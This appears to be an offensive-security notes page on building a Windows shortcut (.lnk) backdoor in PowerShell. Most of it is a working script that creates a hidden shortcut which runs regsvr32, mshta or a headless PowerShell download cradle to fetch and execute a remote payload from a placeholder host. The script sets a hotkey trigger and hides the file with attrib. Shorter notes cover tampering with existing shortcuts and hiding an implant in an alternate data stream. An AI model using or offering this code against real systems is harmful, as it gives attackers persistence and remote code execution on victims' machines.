# Shortcut Links

## 1.1 - Create shortcut backdoor in powershell

- Note: The **TargetPath** has a limit of 260 characters long

```powershell
$shortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)

## Scriptlet files .sct
$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
$Shortcut.Arguments = '/c regsvr32 /s /n /u /i:http://<IP>/shell.sct scrobj.dll'

# For HTA files
# $Shortcut.TargetPath = 'C:\Windows\System32\mshta.exe'
# $Shortcut.Arguments = 'http://<IP>/shell.hta'

# For conhost.exe and powershell one-liner
# $Shortcut.TargetPath = 'conhost.exe'
# $Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/shell.ps1`'))`""
$Shortcut.Description = "A shortcut backdoor"
# $Shortcut.IconLocation = 'C:\path\to\icon.ico'
$Shortcut.IconLocation = 'shell32.dll,21'
$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
$Shortcut.WindowStyle = 7
$Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
$Shortcut.Save()
attrib +h $shortcutPath
```

## 1.2 - Modify existing .lnk shortcuts to insert backdoor in powershell

TODO: I got this covered - Userware

- First gather the variables to recreate a new one.

`PS C:\> Get-CimInstance Win32_ShortcutFile | Select-Object Name, FileName, CreationDate, LastAccessed, Drive, Path, FileType`

```powershell
PS C:\>
```

TODO: Use ADS (Alternate Data Streams) in the `.lnk` file with an implant

```
cmd /c mshta %CD%\Edge.lnk
```

---
## References

- [[Shortcut Link]]

- [List lnk or shortcut files in Windows with PowerShell](https://quickbytesstuff.blogspot.com/2020/05/list-lnk-or-shortcut-files-in-windows.html)

- [Dimitri's Wanderings: Get Shortcut contents in Powershell](https://dimitri.janczak.net/2018/03/26/get-shortcut-contents-in-powershell/)

- [Editing shortcut (.lnk) properties with Powershell](https://theprogrammersfirst.wordpress.com/2020/07/22/editing-shortcut-lnk-properties-with-powershell/)